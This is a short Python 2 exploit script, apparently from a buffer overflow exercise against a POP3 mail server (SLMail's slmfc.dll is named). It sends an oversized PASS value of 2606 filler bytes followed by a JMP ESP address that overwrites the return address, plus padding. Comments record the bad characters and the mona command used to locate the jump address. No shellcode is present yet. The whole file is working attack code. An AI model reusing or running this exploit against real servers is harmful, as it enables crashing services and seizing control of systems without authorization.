#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bad characters  \x00  \x0a  \0d
# JMP ESP FFE4 
# !mona find -s "\xff\xe4 -m slmfc.dll
# 5F4A358F   \x8F\x35\x4A\x5F



buffer = 'A' * 2606 + "\x8f\x35\x4a\x5f" + "C" * (3500 - 2606 - 4)
try:

    print "\nSending evil buffer..."
    s.connect(('10.209.14.46',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
